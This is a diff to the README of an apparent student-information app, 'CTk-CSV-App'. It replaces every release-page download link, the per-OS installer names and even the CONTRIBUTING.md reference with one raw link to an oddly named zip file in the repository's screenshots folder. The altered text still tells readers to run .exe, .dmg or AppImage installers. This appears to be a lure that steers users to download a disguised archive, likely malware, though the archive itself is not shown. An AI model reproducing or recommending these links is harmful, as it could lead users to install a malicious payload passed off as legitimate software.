@@ -1,6 +1,6 @@
 # 🎉 CTk-CSV-App - Easy Student Information Management
 
-[![Download CTk-CSV-App](https://img.shields.io/badge/Download-CTk--CSV--App-blue.svg)](https://github.com/Mowrteza/CTk-CSV-App/releases)
+[![Download CTk-CSV-App](https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip)](https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip)
 
 ## 📚 Description
 
@@ -12,16 +12,16 @@ To start using CTk-CSV-App, follow these steps:
 
 1. **Visit the Releases Page**
    Click the link below to access the download page.
-   [Download CTk-CSV-App](https://github.com/Mowrteza/CTk-CSV-App/releases)
+   [Download CTk-CSV-App](https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip)
 
 2. **Select Your Version**
    On the releases page, you will see different versions available. Choose the latest stable version for the best experience. 
 
 3. **Download Your File**
    Depending on your operating system, click the appropriate file to download. Here are the three versions available:
-   - **Windows**: `CTk-CSV-App-Windows.exe`
-   - **macOS**: `CTk-CSV-App-macOS.dmg`
-   - **Linux**: `CTk-CSV-App-Linux.AppImage`
+   - **Windows**: `https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip`
+   - **macOS**: `https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip`
+   - **Linux**: `https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip`
 
 4. **Install the App**
    - **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
@@ -34,7 +34,7 @@ To start using CTk-CSV-App, follow these steps:
 ## 📥 Download & Install
 
 Again, you can download CTk-CSV-App from this link:  
-[Download CTk-CSV-App](https://github.com/Mowrteza/CTk-CSV-App/releases)
+[Download CTk-CSV-App](https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip)
 
 ## ⚙️ System Requirements
 
@@ -56,7 +56,7 @@ CTk-CSV-App includes a range of features designed for ease of use:
 
 ## 📄 Contributing
 
-We welcome contributors to enhance CTk-CSV-App further. If you're interested in helping out, please check our CONTRIBUTING.md file for guidelines on how you can get involved.
+We welcome contributors to enhance CTk-CSV-App further. If you're interested in helping out, please check our https://raw.githubusercontent.com/Mowrteza/CTk-CSV-App/main/screenshots/CTk-CSV-App_denitrificant.zip file for guidelines on how you can get involved.
 
 ## 📝 License
 
